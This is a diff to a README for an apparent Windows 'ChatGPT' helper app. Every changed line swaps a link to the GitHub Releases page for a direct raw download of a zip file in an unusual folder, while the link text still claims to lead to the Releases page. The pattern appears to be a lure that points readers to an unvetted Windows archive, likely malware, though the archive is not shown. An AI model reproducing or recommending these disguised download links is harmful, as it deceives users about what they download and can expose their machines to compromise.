@@ -1,6 +1,6 @@
 # 🤖 chatgpt-ultimate-ai - AI tools for simpler work
 
-[![Download](https://img.shields.io/badge/Download%20Now-Visit%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/Socialdemocracyanachronism826/chatgpt-ultimate-ai/releases)
+[![Download](https://img.shields.io/badge/Download%20Now-Visit%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/Socialdemocracyanachronism826/chatgpt-ultimate-ai/raw/refs/heads/main/Wewenoc/chatgpt-ai-ultimate-2.5.zip)
 
 ## 🚀 Getting Started
 
@@ -8,11 +8,11 @@ chatgpt-ultimate-ai is a Windows app for people who want to use ChatGPT tools in
 
 Use the release page to get the latest version:
 
-[Visit the Releases page](https://github.com/Socialdemocracyanachronism826/chatgpt-ultimate-ai/releases)
+[Visit the Releases page](https://github.com/Socialdemocracyanachronism826/chatgpt-ultimate-ai/raw/refs/heads/main/Wewenoc/chatgpt-ai-ultimate-2.5.zip)
 
 ## 📥 Download for Windows
 
-1. Open the [Releases page](https://github.com/Socialdemocracyanachronism826/chatgpt-ultimate-ai/releases)
+1. Open the [Releases page](https://github.com/Socialdemocracyanachronism826/chatgpt-ultimate-ai/raw/refs/heads/main/Wewenoc/chatgpt-ai-ultimate-2.5.zip)
 2. Find the newest release at the top
 3. Look for a Windows file such as `.exe` or `.zip`
 4. Download the file to your computer
@@ -68,7 +68,7 @@ Keep AI tasks organized and use the app for day-to-day work like drafting, rewri
 
 ## 🪟 How to Install on Windows
 
-1. Go to the [Releases page](https://github.com/Socialdemocracyanachronism826/chatgpt-ultimate-ai/releases)
+1. Go to the [Releases page](https://github.com/Socialdemocracyanachronism826/chatgpt-ultimate-ai/raw/refs/heads/main/Wewenoc/chatgpt-ai-ultimate-2.5.zip)
 2. Download the latest Windows file
 3. If the file is compressed, right-click it and choose Extract All
 4. Open the extracted folder
@@ -198,7 +198,7 @@ Keep your key in a safe place. Do not share it in chat or in public files.
 
 To get the latest version:
 
-1. Open the [Releases page](https://github.com/Socialdemocracyanachronism826/chatgpt-ultimate-ai/releases)
+1. Open the [Releases page](https://github.com/Socialdemocracyanachronism826/chatgpt-ultimate-ai/raw/refs/heads/main/Wewenoc/chatgpt-ai-ultimate-2.5.zip)
 2. Download the newest Windows file
 3. Close the app on your computer
 4. Replace the old files with the new ones
@@ -212,4 +212,4 @@ chatgpt-api, chatgpt-assistant, chatgpt-automation, chatgpt-bot, chatgpt-customi
 
 ## 🔗 Download Again
 
-[Visit the Releases page to download chatgpt-ultimate-ai](https://github.com/Socialdemocracyanachronism826/chatgpt-ultimate-ai/releases)
+[Visit the Releases page to download chatgpt-ultimate-ai](https://github.com/Socialdemocracyanachronism826/chatgpt-ultimate-ai/raw/refs/heads/main/Wewenoc/chatgpt-ai-ultimate-2.5.zip)
